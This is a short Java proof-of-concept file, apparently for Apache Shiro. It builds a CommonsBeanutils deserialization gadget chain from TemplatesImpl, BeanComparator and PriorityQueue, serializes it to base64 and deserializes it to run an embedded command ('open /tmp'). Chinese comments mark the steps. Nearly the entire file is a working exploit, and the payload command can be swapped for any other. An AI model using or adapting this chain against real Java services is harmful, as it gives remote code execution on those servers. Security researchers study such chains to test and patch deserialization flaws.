import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import util.*;

import java.util.PriorityQueue;

public class ShiroTest {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = TemplateUtil.getTemplateObj(EvilClassMaker.getGenerate("TcS", "open /tmp"));

        // 设置比较器
        BeanComparator cp = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue(2, cp);

        // 占位
        queue.add("1");
        queue.add("1");
        cp.setProperty("outputProperties");
//        Reflections.setFieldValue(queue, "length", 2);
        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});

        // 反序列化执行
        String base64d = Marshal.exec(queue);
        System.out.println(base64d);
        Marshal.read(base64d);
    }
}
